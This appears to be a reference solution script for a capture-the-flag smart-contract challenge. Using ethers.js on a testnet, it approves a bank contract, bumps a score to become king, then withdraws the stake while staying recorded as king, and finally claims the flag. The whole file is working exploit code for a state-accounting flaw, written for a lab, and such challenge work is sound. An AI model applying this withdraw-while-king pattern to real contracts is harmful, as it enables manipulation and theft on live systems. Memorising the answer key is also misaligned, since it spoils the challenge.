#!/usr/bin/env node
// Reference exploit for koth-frozen-king, using sdk/index.js.
//
//   1. approve the bank
//   2. bump(N)      — become king with score N
//   3. withdraw(N)  — leave the throne but stay recorded as king
//   4. ctf.claimFlag() — flag releases as long as no one bumps strictly > N

import { ethers } from "ethers";
import { Ctf } from "../../../sdk/index.js";

const required = ["PLAYER_KEY", "BANK", "TOKEN", "BACKEND", "CHALLENGE"];
for (const k of required) {
  if (!process.env[k]) { console.error(`missing env ${k}`); process.exit(1); }
}

const RPC = process.env.RPC_URL ?? "https://ethereum-sepolia-rpc.publicnode.com";
const BUMP = ethers.parseEther(process.env.BUMP_AMOUNT ?? "100");
const provider = new ethers.JsonRpcProvider(RPC);
const wallet   = new ethers.Wallet(process.env.PLAYER_KEY, provider);
const me = wallet.address;
console.log(`player: ${me}, bumping ${ethers.formatEther(BUMP)} KOTH`);

const ctf = new Ctf({
  backend: process.env.BACKEND,
  challenge: process.env.CHALLENGE,
  player: me,
});

const token = new ethers.Contract(process.env.TOKEN, [
  "function approve(address,uint256) returns (bool)",
  "function balanceOf(address) view returns (uint256)",
], wallet);
const bank = new ethers.Contract(process.env.BANK, [
  "function bump(uint256)",
  "function withdraw(uint256)",
  "function king() view returns (address)",
  "function kingScore() view returns (uint256)",
], wallet);

const bal = await token.balanceOf(me);
if (bal < BUMP) throw new Error(`not enough KOTH: have ${ethers.formatEther(bal)}, need ${ethers.formatEther(BUMP)}`);

let nonce = await wallet.getNonce();
const tx = p => p.then(t => t.wait());

console.log("approve");  await tx(token.approve(process.env.BANK, ethers.MaxUint256, { nonce: nonce++ }));
console.log("bump");     await tx(bank.bump(BUMP,    { nonce: nonce++ }));
console.log(`king = ${await bank.king()}  score = ${ethers.formatEther(await bank.kingScore())}`);
console.log("withdraw — leaves the throne frozen in our name");
await tx(bank.withdraw(BUMP, { nonce: nonce++ }));

const { flag } = await ctf.claimFlag({ poll: 6 });
console.log(`flag: ${flag}`);
